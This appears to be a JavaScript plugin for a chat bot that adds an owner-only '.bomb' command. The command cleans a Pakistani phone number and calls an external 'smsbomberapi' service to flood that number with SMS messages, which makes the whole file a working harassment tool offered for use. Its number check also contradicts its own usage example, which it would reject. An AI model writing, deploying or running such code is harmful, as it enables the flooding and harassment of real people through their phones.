const { cmd } = require('../command');

// Settings
const SMS_API = "https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=";
let isBombing = false;

cmd({
    pattern: "bomb",
    react: "💣",
    desc: "Start SMS Bombing",
    category: "main",
    filename: __filename
}, async (conn, mek, m, { from, isOwner, text, reply }) => {
    try {
        if (!isOwner) return reply("❌ Owner only!");

        // Extract number (ULTIMATE CLEANING)
        const number = text.split(' ')[1]?.replace(/[^0-9]/g, '').replace(/^0+/, '92');
        
        // Validate (any 11-digit PK number)
        if (!number || number.length !== 11) {
            return reply("❌ Invalid number! Use: .bomb 923001234567");
        }

        // Force 92 prefix if missing
        const finalNumber = number.startsWith('92') ? number : `92${number}`;
        
        // Start bombing
        const apiUrl = `${SMS_API}${finalNumber}`;
        const response = await fetch(apiUrl);
        
        if (response.ok) {
            reply(`✅ Bombing started on ${finalNumber}`);
        } else {
            reply(`❌ API rejected this number (Status: ${response.status})`);
        }

    } catch (error) {
        console.error("Bomb Error:", error);
        reply(`⚠️ Error: ${error.message}`);
    }
});
